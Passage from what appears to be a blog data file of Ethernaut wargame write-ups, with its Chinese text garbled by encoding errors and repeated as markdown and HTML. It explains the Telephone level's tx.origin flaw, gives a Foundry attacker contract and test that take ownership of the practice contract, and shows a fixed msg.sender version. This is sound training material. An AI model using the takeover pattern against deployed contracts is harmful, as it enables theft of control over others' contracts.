ç”¨æˆ·åœ°å€ (äº¤æ˜“å‘èµ·è€…)\n- `msg.sender` = æ”»å‡»åˆçº¦åœ°å€ (ç›´æ¥è°ƒç”¨è€…)\n- ç”±äº `tx.origin != msg.sender`ï¼Œæ¡ä»¶æ»¡è¶³ï¼Œå¯ä»¥ä¿®æ”¹ owner\n\n## ğŸ’» Foundry å®ç°\n\n### æ”»å‡»åˆçº¦ä»£ç \n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"../src/Telephone.sol\";\n\ncontract TelephoneAttacker {\n    Telephone public target;\n    \n    constructor(address _target) {\n        target = Telephone(_target);\n    }\n    \n    function attack(address _newOwner) public {\n        // é€šè¿‡ä¸­é—´åˆçº¦è°ƒç”¨ï¼Œä½¿ tx.origin â‰  msg.sender\n        target.changeOwner(_newOwner);\n    }\n}\n\ncontract TelephoneTest is Test {\n    Telephone public telephone;\n    TelephoneAttacker public attacker;\n    \n    address public user = makeAddr(\"user\");\n    address public newOwner = makeAddr(\"newOwner\");\n\n    function setUp() public {\n        telephone = new Telephone();\n        attacker = new TelephoneAttacker(address(telephone));\n    }\n\n    function testTelephoneExploit() public {\n        vm.startPrank(user);\n        \n        // é€šè¿‡ä¸­é—´åˆçº¦æ”»å‡»\n        attacker.attack(newOwner);\n        \n        vm.stopPrank();\n        \n        // éªŒè¯æ”»å‡»æˆåŠŸ\n        assertEq(telephone.owner(), newOwner);\n        console.log(\"Attack successful! New owner:\", telephone.owner());\n    }\n}\n```\n\n## ğŸ›¡ï¸ é˜²å¾¡æªæ–½\n\n### ä½¿ç”¨ msg.sender è¿›è¡Œèº«ä»½éªŒè¯\n\n```solidity\ncontract SecureTelephone {\n    address public owner;\n    \n    modifier onlyOwner() {\n        require(msg.sender == owner, \"Not the owner\");\n        _;\n    }\n    \n    function changeOwner(address _newOwner) public onlyOwner {\n        owner = _newOwner;\n    }\n}\n```\n\n## ğŸ¯ æ€»ç»“\n\nTelephone å…³å¡æ•™å¯¼æˆ‘ä»¬ï¼š\n- âœ… æ°¸è¿œä¸è¦ä½¿ç”¨ `tx.origin` è¿›è¡Œèº«ä»½éªŒè¯\n- âœ… ä½¿ç”¨ `msg.sender` è¿›è¡Œå®‰å…¨çš„èº«ä»½æ£€æŸ¥\n- âœ… ç†è§£è°ƒç”¨é“¾ä¸­çš„èº«ä»½ä¼ é€’æœºåˆ¶\n\n---\n\n## ğŸ”— ç›¸å…³é“¾æ¥\n\n- **[ä¸Šä¸€å…³: Level 3 - Coin Flip](/2025/01/25/ethernaut-level-03-coinflip/)**\n- **[ä¸‹ä¸€å…³: Level 5 - Token](/2025/01/25/ethernaut-level-05-token/)**\n- **[ç³»åˆ—ç›®å½•: Ethernaut Foundry Solutions](/2025/01/25/ethernaut-foundry-solutions-series/)**\n- **[GitHub é¡¹ç›®](https://github.com/XuHugo/Ethernaut-Foundry-Solutions)**","slug":"ethernaut-level-04-telephone","published":1,"comments":1,"layout":"post","photos":[],"_id":"cmfc7zbp2000gbf5q42ol9h3q","content":"<h1 id=\"ğŸ¯-Ethernaut-Level-4-Telephone-tx-origin-vs-msg-sender-èº«ä»½éªŒè¯ç»•è¿‡\"><a href=\"#ğŸ¯-Ethernaut-Level-4-Telephone-tx-origin-vs-msg-sender-èº«ä»½éªŒè¯ç»•è¿‡\" class=\"headerlink\" title=\"ğŸ¯ Ethernaut Level 4: Telephone - tx.origin vs msg.sender èº«ä»½éªŒè¯ç»•è¿‡\"></a>ğŸ¯ Ethernaut Level 4: Telephone - tx.origin vs msg.sender èº«ä»½éªŒè¯ç»•è¿‡</h1><blockquote>\n<p><strong>å…³å¡é“¾æ¥</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/4\">Ethernaut Level 4 - Telephone</a><br><strong>æ”»å‡»ç±»å‹</strong>: èº«ä»½éªŒè¯ç»•è¿‡ã€ä¸­é—´åˆçº¦æ”»å‡»<br><strong>éš¾åº¦</strong>: â­â­â˜†â˜†â˜†</p>\n</blockquote>\n<h2 id=\"ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\"><a href=\"#ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\" class=\"headerlink\" title=\"ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\"></a>ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡</h2><ol>\n<li><strong>è·å–åˆçº¦æ§åˆ¶æƒ</strong> - æˆä¸º <code>Telephone</code> åˆçº¦çš„ <code>owner</code></li>\n<li><strong>ç†è§£èº«ä»½æœºåˆ¶</strong> - æŒæ¡ <code>tx.origin</code> å’Œ <code>msg.sender</code> çš„åŒºåˆ«</li>\n</ol>\n<h2 id=\"ğŸ”-æ¼æ´åˆ†æ\"><a href=\"#ğŸ”-æ¼æ´åˆ†æ\" class=\"headerlink\" title=\"ğŸ” æ¼æ´åˆ†æ\"></a>ğŸ” æ¼æ´åˆ†æ</h2><h3 id=\"åˆçº¦æºç åˆ†æ\"><a href=\"#åˆçº¦æºç åˆ†æ\" class=\"headerlink\" title=\"åˆçº¦æºç åˆ†æ\"></a>åˆçº¦æºç åˆ†æ</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">contract Telephone &#123;</span><br><span class=\"line\">    address public owner;</span><br><span class=\"line\"></span><br><span class=\"line\">    constructor() &#123;</span><br><span class=\"line\">        owner = msg.sender;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function changeOwner(address _owner) public &#123;</span><br><span class=\"line\">        // ğŸš¨ æ¼æ´ï¼šä½¿ç”¨ tx.origin è¿›è¡Œèº«ä»½éªŒè¯</span><br><span class=\"line\">        if (tx.origin != msg.sender) &#123;</span><br><span class=\"line\">            owner = _owner;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"å…³é”®æ¦‚å¿µå¯¹æ¯”\"><a href=\"#å…³é”®æ¦‚å¿µå¯¹æ¯”\" class=\"headerlink\" title=\"å…³é”®æ¦‚å¿µå¯¹æ¯”\"></a>å…³é”®æ¦‚å¿µå¯¹æ¯”</h3><table>\n<thead>\n<tr>\n<th>å±æ€§</th>\n<th><code>msg.sender</code></th>\n<th><code>tx.origin</code></th>\n</tr>\n</thead>\n<tbody><tr>\n<td><strong>å®šä¹‰</strong></td>\n<td>ç›´æ¥è°ƒç”¨è€…</td>\n<td>äº¤æ˜“å‘èµ·è€…</td>\n</tr>\n<tr>\n<td><strong>å˜åŒ–</strong></td>\n<td>æ¯æ¬¡è°ƒç”¨éƒ½å¯èƒ½å˜åŒ–</td>\n<td>æ•´ä¸ªäº¤æ˜“é“¾ä¸­ä¸å˜</td>\n</tr>\n<tr>\n<td><strong>å®‰å…¨æ€§</strong></td>\n<td>âœ… å®‰å…¨</td>\n<td>âŒ å±é™©</td>\n</tr>\n<tr>\n<td><strong>æ¨èä½¿ç”¨</strong></td>\n<td>èº«ä»½éªŒè¯</td>\n<td>ä»…ç”¨äºæ—¥å¿—è®°å½•</td>\n</tr>\n</tbody></table>\n<h3 id=\"æ”»å‡»åŸç†\"><a href=\"#æ”»å‡»åŸç†\" class=\"headerlink\" title=\"æ”»å‡»åŸç†\"></a>æ”»å‡»åŸç†</h3><p>å½“æˆ‘ä»¬é€šè¿‡ä¸­é—´åˆçº¦è°ƒç”¨æ—¶ï¼š</p>\n<ul>\n<li><code>tx.origin</code> &#x3D; ç”¨æˆ·åœ°å€ (äº¤æ˜“å‘èµ·è€…)</li>\n<li><code>msg.sender</code> &#x3D; æ”»å‡»åˆçº¦åœ°å€ (ç›´æ¥è°ƒç”¨è€…)</li>\n<li>ç”±äº <code>tx.origin != msg.sender</code>ï¼Œæ¡ä»¶æ»¡è¶³ï¼Œå¯ä»¥ä¿®æ”¹ owner</li>\n</ul>\n<h2 id=\"ğŸ’»-Foundry-å®ç°\"><a href=\"#ğŸ’»-Foundry-å®ç°\" class=\"headerlink\" title=\"ğŸ’» Foundry å®ç°\"></a>ğŸ’» Foundry å®ç°</h2><h3 id=\"æ”»å‡»åˆçº¦ä»£ç \"><a href=\"#æ”»å‡»åˆçº¦ä»£ç \" class=\"headerlink\" title=\"æ”»å‡»åˆçº¦ä»£ç \"></a>æ”»å‡»åˆçº¦ä»£ç </h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: MIT</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;../src/Telephone.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">contract TelephoneAttacker &#123;</span><br><span class=\"line\">    Telephone public target;</span><br><span class=\"line\">    </span><br><span class=\"line\">    constructor(address _target) &#123;</span><br><span class=\"line\">        target = Telephone(_target);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function attack(address _newOwner) public &#123;</span><br><span class=\"line\">        // é€šè¿‡ä¸­é—´åˆçº¦è°ƒç”¨ï¼Œä½¿ tx.origin â‰  msg.sender</span><br><span class=\"line\">        target.changeOwner(_newOwner);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract TelephoneTest is Test &#123;</span><br><span class=\"line\">    Telephone public telephone;</span><br><span class=\"line\">    TelephoneAttacker public attacker;</span><br><span class=\"line\">    </span><br><span class=\"line\">    address public user = makeAddr(&quot;user&quot;);</span><br><span class=\"line\">    address public newOwner = makeAddr(&quot;newOwner&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        telephone = new Telephone();</span><br><span class=\"line\">        attacker = new TelephoneAttacker(address(telephone));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function testTelephoneExploit() public &#123;</span><br><span class=\"line\">        vm.startPrank(user);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // é€šè¿‡ä¸­é—´åˆçº¦æ”»å‡»</span><br><span class=\"line\">        attacker.attack(newOwner);</span><br><span class=\"line\">        </span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">        </span><br><span class=\"line\">        // éªŒè¯æ”»å‡»æˆåŠŸ</span><br><span class=\"line\">        assertEq(telephone.owner(), newOwner);</span><br><span class=\"line\">        console.log(&quot;Attack successful! New owner:&quot;, telephone.owner());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ğŸ›¡ï¸-é˜²å¾¡æªæ–½\"><a href=\"#ğŸ›¡ï¸-é˜²å¾¡æªæ–½\" class=\"headerlink\" title=\"ğŸ›¡ï¸ é˜²å¾¡æªæ–½\"></a>ğŸ›¡ï¸ é˜²å¾¡æªæ–½</h2><h3 id=\"ä½¿ç”¨-msg-sender-è¿›è¡Œèº«ä»½éªŒè¯\"><a href=\"#ä½¿ç”¨-msg-sender-è¿›è¡Œèº«ä»½éªŒè¯\" class=\"headerlink\" title=\"ä½¿ç”¨ msg.sender è¿›è¡Œèº«ä»½éªŒè¯\"></a>ä½¿ç”¨ msg.sender è¿›è¡Œèº«ä»½éªŒè¯</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract SecureTelephone &#123;</span><br><span class=\"line\">    address public owner;</span><br><span class=\"line\">    </span><br><span class=\"line\">    modifier onlyOwner() &#123;</span><br><span class=\"line\">        require(msg.sender == owner, &quot;Not the owner&quot;);</span><br><span class=\"line\">        _;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function changeOwner(address _newOwner) public onlyOwner &#123;</span><br><span class=\"line\">        owner = _newOwner;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ğŸ¯-æ€»ç»“\"><a href=\"#ğŸ¯-æ€»ç»“\" class=\"headerlink\" title=\"ğŸ¯ æ€»ç»“\"></a>ğŸ¯ æ€»ç»“</h2><p>Telephone å…³å¡æ•™å¯¼æˆ‘ä»¬ï¼š</p>\n<ul>\n<li>âœ… æ°¸è¿œä¸è¦ä½¿ç”¨ <code>tx.origin</code> è¿›è¡Œèº«ä»½éªŒè¯</li>\n<li>âœ… ä½¿ç”¨ <code>msg.sender</code> è¿›è¡Œå®‰å…¨çš„èº«ä»½æ£€æŸ¥</li>\n<li>âœ… ç†è§£è°ƒç”¨é“¾ä¸­çš„èº«ä»½ä¼ é€’æœºåˆ¶</li>\n</ul>\n<hr>\n<h2 id=\"ğŸ”—-ç›¸å…³é“¾æ¥\"><a href=\"#ğŸ”—-ç›¸å…³é“¾æ¥\" class=\"headerlink\" title=\"ğŸ”— ç›¸å…³é“¾æ¥\"></a>ğŸ”— ç›¸å…³é“¾æ¥</h2><ul>\n<li><strong><a href=\"/2025/01/25/ethernaut-level-03-coinflip/\">ä¸Šä¸€å…³: Level 3 - Coin Flip</a></strong></li>\n<li><strong><a href=\"/2025/01/25/ethernaut-level-05-token/\">ä¸‹ä¸€å…³: Level 5 - Token</a></strong></li>\n<li><strong><a href=\"/2025/01/25/ethernaut-foundry-solutions-series/\">ç³»åˆ—ç›®å½•: Ethernaut Foundry Solutions</a></strong></li>\n<li><strong><a href=\"https://github.com/XuHugo/Ethernaut-Foundry-Solutions\">GitHub é¡¹ç›®</a></strong></li>\n</ul>\n","more":"<h1 id=\"ğŸ¯-Ethernaut-Level-4-Telephone-tx-origin-vs-msg-sender-èº«ä»½éªŒè¯ç»•è¿‡\"><a href=\"#ğŸ¯-Ethernaut-Level-4-Telephone-tx-origin-vs-msg-sender-èº«ä»½éªŒè¯ç»•è¿‡\" class=\"headerlink\" title=\"ğŸ¯ Ethernaut Level 4: Telephone - tx.origin vs msg.sender èº«ä»½éªŒè¯ç»•è¿‡\"></a>ğŸ¯ Ethernaut Level 4: Telephone - tx.origin vs msg.sender èº«ä»½éªŒè¯ç»•è¿‡</h1><blockquote>\n<p><strong>å…³å¡é“¾æ¥</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/4\">Ethernaut Level 4 - Telephone</a><br><strong>æ”»å‡»ç±»å‹</strong>: èº«ä»½éªŒè¯ç»•è¿‡ã€ä¸­é—´åˆçº¦æ”»å‡»<br><strong>éš¾åº¦</strong>: â­â­â˜†â˜†â˜†</p>\n</blockquote>\n<h2 id=\"ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\"><a href=\"#ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\" class=\"headerlink\" title=\"ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\"></a>ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡</h2><ol>\n<li><strong>è·å–åˆçº¦æ§åˆ¶æƒ</strong> - æˆä¸º <code>Telephone</code> åˆçº¦çš„ <code>owner</code></li>\n<li><strong>ç†è§£èº«ä»½æœºåˆ¶</strong> - æŒæ¡ <code>tx.origin</code> å’Œ <code>msg.sender</code> çš„åŒºåˆ«</li>\n</ol>\n<h2 id=\"ğŸ”-æ¼æ´åˆ†æ\"><a href=\"#ğŸ”-æ¼æ´åˆ†æ\" class=\"headerlink\" title=\"ğŸ” æ¼æ´åˆ†æ\"></a>ğŸ” æ¼æ´åˆ†æ</h2><h3 id=\"åˆçº¦æºç åˆ†æ\"><a href=\"#åˆçº¦æºç åˆ†æ\" class=\"headerlink\" title=\"åˆçº¦æºç åˆ†æ\"></a>åˆçº¦æºç åˆ†æ</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">contract Telephone &#123;</span><br><span class=\"line\">    address public owner;</span><br><span class=\"line\"></span><br><span class=\"line\">    constructor() &#123;</span><br><span class=\"line\">        owner = msg.sender;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function changeOwner(address _owner) public &#123;</span><br><span class=\"line\">        // ğŸš¨ æ¼æ´ï¼šä½¿ç”¨ tx.origin è¿›è¡Œèº«ä»½éªŒè¯</span><br><span class=\"line\">        if (tx.origin != msg.sender) &#123;</span><br><span class=\"line\">            owner = _owner;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"å…³é”®æ¦‚å¿µå¯¹æ¯”\"><a href=\"#å…³é”®æ¦‚å¿µå¯¹æ¯”\" class=\"headerlink\" title=\"å…³é”®æ¦‚å¿µå¯¹æ¯”\"></a>å…³é”®æ¦‚å¿µå¯¹æ¯”</h3><table>\n<thead>\n<tr>\n<th>å±æ€§</th>\n<th><code>msg.sender</code></th>\n<th><code>tx.origin</code></th>\n</tr>\n</thead>\n<tbody><tr>\n<td><strong>å®šä¹‰</strong></td>\n<td>ç›´æ¥è°ƒç”¨è€…</td>\n<td>äº¤æ˜“å‘èµ·è€…</td>\n</tr>\n<tr>\n<td><strong>å˜åŒ–</strong></td>\n<td>æ¯æ¬¡è°ƒç”¨éƒ½å¯èƒ½å˜åŒ–</td>\n<td>æ•´ä¸ªäº¤æ˜“é“¾ä¸­ä¸å˜</td>\n</tr>\n<tr>\n<td><strong>å®‰å…¨æ€§</strong></td>\n<td>âœ… å®‰å…¨</td>\n<td>âŒ å±é™©</td>\n</tr>\n<tr>\n<td><strong>æ¨èä½¿ç”¨</strong></td>\n<td>èº«ä»½éªŒè¯</td>\n<td>ä»…ç”¨äºæ—¥å¿—è®°å½•</td>\n</tr>\n</tbody></table>\n<h3 id=\"æ”»å‡»åŸç†\"><a href=\"#æ”»å‡»åŸç†\" class=\"headerlink\" title=\"æ”»å‡»åŸç†\"></a>æ”»å‡»åŸç†</h3><p>å½“æˆ‘ä»¬é€šè¿‡ä¸­é—´åˆçº¦è°ƒç”¨æ—¶ï¼š</p>\n<ul>\n<li><code>tx.origin</code> &#x3D; ç”¨æˆ·åœ°å€ (äº¤æ˜“å‘èµ·è€…)</li>\n<li><code>msg.sender</code> &#x3D; æ”»å‡»åˆçº¦åœ°å€ (ç›´æ¥è°ƒç”¨è€…)</li>\n<li>ç”±äº <code>tx.origin != msg.sender</code>ï¼Œæ¡ä»¶æ»¡è¶³ï¼Œå¯ä»¥ä¿®æ”¹ owner</li>\n</ul>\n<h2 id=\"ğŸ’»-Foundry-å®ç°\"><a href=\"#ğŸ’»-Foundry-å®ç°\" class=\"headerlink\" title=\"ğŸ’» Foundry å®ç°\"></a>ğŸ’» Foundry å®ç°</h2><h3 id=\"æ”»å‡»åˆçº¦ä»£ç \"><a href=\"#æ”»å‡»åˆçº¦ä»£ç \" class=\"headerlink\" title=\"æ”»å‡»åˆçº¦ä»£ç \"></a>æ”»å‡»åˆçº¦ä»£ç </h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: MIT</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;../src/Telephone.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">contract TelephoneAttacker &#123;</span><br><span class=\"line\">    Telephone public target;</span><br><span class=\"line\">    </span><br><span class=\"line\">    constructor(address _target) &#123;</span><br><span class=\"line\">        target = Telephone(_target);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function attack(address _newOwner) public &#123;</span><br><span class=\"line\">        // é€šè¿‡ä¸­é—´åˆçº¦è°ƒç”¨ï¼Œä½¿ tx.origin â‰  msg.sender</span><br><span class=\"line\">        target.changeOwner(_newOwner);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract TelephoneTest is Test &#123;</span><br><span class=\"line\">    Telephone public telephone;</span><br><span class=\"line\">    TelephoneAttacker public attacker;</span><br><span class=\"line\">    </span><br><span class=\"line\">    address public user = makeAddr(&quot;user&quot;);</span><br><span class=\"line\">    address public newOwner = makeAddr(&quot;newOwner&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        telephone = new Telephone();</span><br><span class=\"line\">        attacker = new TelephoneAttacker(address(telephone));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function testTelephoneExploit() public &#123;</span><br><span class=\"line\">        vm.startPrank(user);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // é€šè¿‡ä¸­é—´åˆçº¦æ”»å‡»</span><br><span class=\"line\">        attacker.attack(newOwner);</span><br><span class=\"line\">        </span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">        </span><br><span class=\"line\">        // éªŒè¯æ”»å‡»æˆåŠŸ</span><br><span class=\"line\">        assertEq(telephone.owner(), newOwner);</span><br><span class=\"line\">        console.log(&quot;Attack successful! New owner:&quot;, telephone.owner());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ğŸ›¡ï¸-é˜²å¾¡æªæ–½\"><a href=\"#ğŸ›¡ï¸-é˜²å¾¡æªæ–½\" class=\"headerlink\" title=\"ğŸ›¡ï¸ é˜²å¾¡æªæ–½\"></a>ğŸ›¡ï¸ é˜²å¾¡æªæ–½</h2><h3 id=\"ä½¿ç”¨-msg-sender-è¿›è¡Œèº«ä»½éªŒè¯\"><a href=\"#ä½¿ç”¨-msg-sender-è¿›è¡Œèº«ä»½éªŒè¯\" class=\"headerlink\" title=\"ä½¿ç”¨ msg.sender è¿›è¡Œèº«ä»½éªŒè¯\"></a>ä½¿ç”¨ msg.sender è¿›è¡Œèº«ä»½éªŒè¯</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract SecureTelephone &#123;</span><br><span class=\"line\">    address public owner;</span><br><span class=\"line\">    </span><br><span class=\"line\">    modifier onlyOwner() &#123;</span><br><span class=\"line\">        require(msg.sender == owner, &quot;Not the owner&quot;);</span><br><span class=\"line\">        _;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function changeOwner(address _newOwner) public onlyOwner &#123;</span><br><span class=\"line\">        owner = _newOwner;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ğŸ¯-æ€»ç»“\"><a href=\"#ğŸ¯-æ€»ç»“\" class=\"headerlink\" title=\"ğŸ¯ æ€»ç»“\"></a>ğŸ¯ æ€»ç»“</h2><p>Telephone å…³å¡æ•™å¯¼æˆ‘ä»¬ï¼š</p>\n<ul>\n<li>âœ… æ°¸è¿œä¸è¦ä½¿ç”¨ <code>tx.origin</code> è¿›è¡Œèº«ä»½éªŒè¯</li>\n<li>âœ… ä½¿ç”¨ <code>msg.sender</code> è¿›è¡Œå®‰å…¨çš„èº«ä»½æ£€æŸ¥</li>\n<li>âœ… ç†è§£è°ƒç”¨é“¾ä¸­çš„èº«ä»½ä¼ é€’æœºåˆ¶</li>\n</ul>\n<hr>\n<h2 id=\"ğŸ”—-ç›¸å…³é“¾æ¥\"><a href=\"#ğŸ”—-ç›¸å…³é“¾æ¥\" class=\"headerlink\" title=\"ğŸ”— ç›¸å…³é“¾æ¥\"></a>ğŸ”— ç›¸å…³é“¾æ¥</h2><ul>\n<li><strong><a href=\"/2025/01/25/ethernaut-level-03-coinflip/\">ä¸Šä¸€å…³: Level 3 - Coin Flip</a></strong></li>\n<li><strong><a href=\"/2025/01/25/ethernaut-level-05-token/\">ä¸‹ä¸€å…³: Level 5 - Token</a></strong></li>\n<li><strong><a href=\"/2025/01/25/ethernaut-foundry-solutions-series/\">ç³»åˆ—ç›®å½•: Ethernaut Foundry Solutions</a></strong></li>\n<li><strong><a href=\"https://github.com/XuHugo/Ethernaut-Foundry-Solutions\">GitHub é¡¹ç›®</a></strong></li>\n</ul>\n"},{"title":"Ethernaut Level 5: Token - æ•´æ•°ä¸‹æº¢æ”»å‡»è¯¦è§£","date":"2025-01-25T07:10:00.000Z","updated":"2025-01-25T07:10:00.000Z","series":"Ethernaut Foundry Solutions","excerpt":"æ·±å…¥å­¦ä¹ æ•´æ•°ä¸‹æº¢æ”»å‡»çš„åŸç†å’Œå±å®³ï¼Œäº†è§£ SafeMath åº“çš„é‡è¦æ€§å’Œç°ä»£ Solidity çš„å†…ç½®ä¿æŠ¤æœºåˆ¶ã€‚","_content":"\n# ğŸ¯ Ethernaut Level 5: Token - æ•´æ•°ä¸‹æº¢æ”»å‡»è¯¦è§£\n\n> **å…³å¡é“¾æ¥**: [Ethernaut Level 5 - Token](https://ethernaut.openzeppelin.com/level/5)  \n> **æ”»å‡»ç±»å‹**: æ•´æ•°ä¸‹æº¢æ”»å‡»  \n> **éš¾åº¦**: â­â­â­â˜†â˜†\n\n## ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\n\n1. **è·å¾—å¤§é‡ä»£å¸** - ä»åˆå§‹çš„ 20 ä¸ªä»£å¸å¢åŠ åˆ°å¤§é‡ä»£å¸\n2. 